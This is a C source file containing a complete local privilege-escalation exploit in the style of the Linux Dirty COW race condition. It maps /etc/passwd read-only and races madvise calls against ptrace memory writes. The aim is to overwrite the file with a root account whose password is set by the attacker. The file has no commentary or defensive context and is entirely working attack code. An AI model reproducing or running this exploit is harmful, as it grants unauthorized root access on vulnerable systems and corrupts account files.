#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename = "/etc/passwd";
const char *salt = "pwned";
int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;
struct Userinfo
{
	char *username;
	char *hash;
	int user_id;
	int group_id;
	char *info;
	char *home_dir;
	char *shell;
};
char *generate_passwd_line(struct Userinfo u)
{
	const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
	int size = snprintf(NULL, 0, format, u.username, u.hash, u.user_id, u.group_id, u.info, u.home_dir, u.shell);
	char *ret = malloc(size + 1);
	sprintf(ret, format, u.username, u.hash, u.user_id, u.group_id, u.info, u.home_dir, u.shell);
	return ret;
}
void *madviseThread(void *arg)
{
	int i, c = 0;
	for (i = 0; i < 200000000; i++)
		c += madvise(map, 100, MADV_DONTNEED);
}
int main(int argc, char *argv[])
{
	struct Userinfo user;
	user.username = "root";
	user.user_id = 0;
	user.group_id = 0;
	user.info = "125";
	user.home_dir = "/root";
	user.shell = "/bin/bash";
	char *plaintext_pw = "miao";
	user.hash = crypt(plaintext_pw, salt);
	char *complete_passwd_line = generate_passwd_line(user);
	f = open(filename, O_RDONLY);
	fstat(f, &st);
	map = mmap(NULL, st.st_size + sizeof(long), PROT_READ, MAP_PRIVATE, f, 0);
	pid = fork();
	if (pid)
	{
		waitpid(pid, NULL, 0);
		int u, i, o, c = 0;
		int l = strlen(complete_passwd_line);
		for (i = 0; i < 10000 / l; i++)
			for (o = 0; o < l; o++)
				for (u = 0; u < 10000; u++)
					c += ptrace(PTRACE_POKETEXT, pid, map + o, *((long *)(complete_passwd_line + o)));
	}
	else
	{
		pthread_create(&pth, NULL, madviseThread, NULL);
		ptrace(PTRACE_TRACEME);
		kill(getpid(), SIGSTOP);
		pthread_join(pth, NULL);
	}
	return 0;
}